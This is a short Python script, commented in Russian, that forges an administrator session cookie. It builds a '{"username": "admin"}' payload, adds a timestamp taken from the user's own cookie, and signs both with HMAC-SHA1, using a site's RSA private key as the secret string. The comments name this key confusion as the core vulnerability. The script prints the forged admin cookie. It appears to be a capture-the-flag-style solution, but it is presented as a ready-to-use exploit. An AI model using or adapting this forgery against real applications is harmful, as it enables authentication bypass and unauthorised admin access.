import hmac
import hashlib
import base64

# 1. Вставь сюда свой ПРИВАТНЫЙ КЛЮЧ (целиком, как на сайте)
PRIVATE_KEY = """-----BEGIN PRIVATE KEY-----
MIIBu... (ТУТ ТВОЙ ДЛИННЫЙ КЛЮЧ) ...
-----END PRIVATE KEY-----"""

# 2. Вставь сюда любую рабочую временную метку (из твоей куки - средняя часть)
# Токен выглядит так: part1.part2.part3
# part2 - это timestamp (например, "aZCbaw")
TIMESTAMP_PART = "aZCbaw" 

def forge():
    # Готовим заголовок для Админа
    # {"username": "admin"} в Base64Url
    header = b'{"username": "admin"}'
    part1 = base64.urlsafe_b64encode(header).decode().rstrip('=')
    
    # Собираем данные: payload.timestamp
    data_to_sign = f"{part1}.{TIMESTAMP_PART}"

    # Подписываем (HMAC-SHA1), используя приватный ключ как пароль
    # Это главная уязвимость: ключ RSA используется как строка-секрет
    signature = hmac.new(
        PRIVATE_KEY.strip().encode(), 
        data_to_sign.encode(), 
        hashlib.sha1
    ).digest()
    
    part3 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

    print(f"\n[+] ТВОЯ АДМИНСКАЯ КУКА:\n{data_to_sign}.{part3}")

if __name__ == "__main__":
    forge()
